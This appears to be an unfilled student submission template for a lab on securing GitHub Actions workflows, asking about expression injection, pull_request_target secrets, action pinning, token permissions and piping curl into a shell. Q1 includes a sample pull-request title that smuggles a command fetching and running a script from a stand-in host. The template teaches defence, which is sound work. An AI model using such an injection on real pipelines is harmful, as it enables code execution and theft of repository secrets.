# Submission

Fork URL: <!-- paste the URL of your fork here -->

## Files to commit

- [ ] `.github/workflows/ci.yml`, `preview.yml` and `release.yml`: fixed
- [ ] `SECURITY-NOTES.md`: what was wrong in each workflow

## Questions

Answer in your own words. Where a question asks for output, paste it in a code block.

### Q1. Run `python3 attack/simulate.py` on the original `ci.yml` and paste what the runner would execute for a pull request titled `x"; curl evil.example | sh; echo "`. Why does the expression `${{ ... }}` become part of the shell script instead of data?

**Your answer:**

<!-- replace this line with your answer -->

### Q2. Show the fix for the injection (an environment variable). Why does `env: TITLE: ${{ github.event.pull_request.title }}` followed by `"$TITLE"` make the same title harmless?

**Your answer:**

<!-- replace this line with your answer -->

### Q3. `pull_request_target` runs with the base repository's secrets and write token. Why is checking out the pull request's code in that workflow equivalent to giving the author your secrets? What did you change, and what can the pull-request workflow no longer do?

**Your answer:**

<!-- replace this line with your answer -->

### Q4. Why must a third-party action be pinned to a commit SHA and not to `@v2` or `@main`? What can the owner of that action's repository do to every pipeline that uses the moving tag? How do you keep SHAs up to date (Dependabot)?

**Your answer:**

<!-- replace this line with your answer -->

### Q5. What does `permissions:` do, what is the default token permission of a repository, and what is the minimum each of your three workflows needs? Which job needed `contents: write` and why only that job?

**Your answer:**

<!-- replace this line with your answer -->

### Q6. Why is `curl ... | bash` in a pipeline worse than on your laptop? What did you use instead (a pinned version, a checksum, a package)?

**Your answer:**

<!-- replace this line with your answer -->

### Q7. Paste the output of `./verify.sh`. It must end with **ALL CHECKS PASSED**.

**Your answer:**

<!-- replace this line with your answer -->

### Q8. **Tear down.** Paste the output of `./verify-teardown.sh`. It must end with **TEARDOWN VERIFIED**.

**Your answer:**

<!-- replace this line with your answer -->
